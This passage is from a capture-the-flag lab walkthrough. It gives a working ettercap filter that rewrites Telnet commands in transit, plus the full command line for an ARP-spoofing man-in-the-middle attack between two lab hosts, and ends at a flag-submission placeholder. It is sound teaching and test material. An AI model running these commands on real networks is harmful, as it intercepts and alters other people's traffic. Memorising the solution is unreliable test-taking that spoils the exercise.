1. **Write the filter.** Save the following as `modify.ef` on vma:

   ```
   if (ip.proto == TCP && tcp.dst == 23) {
       if (search(DATA.data, "bait.txt")) {
           replace("bait.txt", "flag.txt");
           msg("replaced bait.txt with flag.txt\n");
       }
   }
   ```

   The strings are deliberately the same length so the TCP payload stays the same size and TCP sequence numbers don't drift.

2. **Compile it:**

   `etterfilter modify.ef -o modify.ecf`

3. **Stop the standalone arpspoof processes** if they are still running — ettercap will do its own ARP MITM. Then start ettercap with the filter and ARP MITM in one shot:

   `sudo ettercap -T -q -i eth1 -F modify.ecf -M arp:remote /192.168.25.10// /192.168.25.20//`

   The two `///` syntax tells ettercap the two endpoints. `-T -q` keeps the output terse. `-M arp:remote` is the bidirectional ARP MITM, equivalent to your two arpspoof terminals from level 2.

4. **Wait for the next vm2 cycle** (≤30 s). When the message `replaced bait.txt with flag.txt` appears in ettercap's terminal, the filter just fired. vm1 will execute the modified command and the flag will flow back through you. Ettercap prints intercepted data; the flag will appear as the response to the modified `cat`.

5. Read the flag and submit it as **`${ANSWER}`**.
